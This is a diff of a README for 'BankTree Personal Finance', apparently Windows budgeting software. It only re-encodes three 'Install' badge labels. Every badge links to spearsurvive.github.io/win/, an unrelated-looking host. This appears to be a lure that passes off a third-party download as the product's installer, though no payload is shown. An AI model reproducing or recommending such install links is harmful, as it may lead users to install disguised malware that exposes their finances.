@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install BankTree Personal Finance](https://img.shields.io/badge/⬇_Install_BankTree%20Personal%20Finance-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install BankTree Personal Finance](https://img.shields.io/badge/⬇_Install_BankTree+Personal+Finance-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ BankTree Personal Finance is a Windows budget and account management software wi
 
 <div align="center">
 
-[![⬇ Install BankTree Personal Finance](https://img.shields.io/badge/⬇_Install_BankTree%20Personal%20Finance-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install BankTree Personal Finance](https://img.shields.io/badge/⬇_Install_BankTree+Personal+Finance-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ BankTree Personal Finance is a Windows budget and account management software wi
 
 <div align="center">
 
-[![⬇ Install BankTree Personal Finance](https://img.shields.io/badge/⬇_Install_BankTree%20Personal%20Finance-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install BankTree Personal Finance](https://img.shields.io/badge/⬇_Install_BankTree+Personal+Finance-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
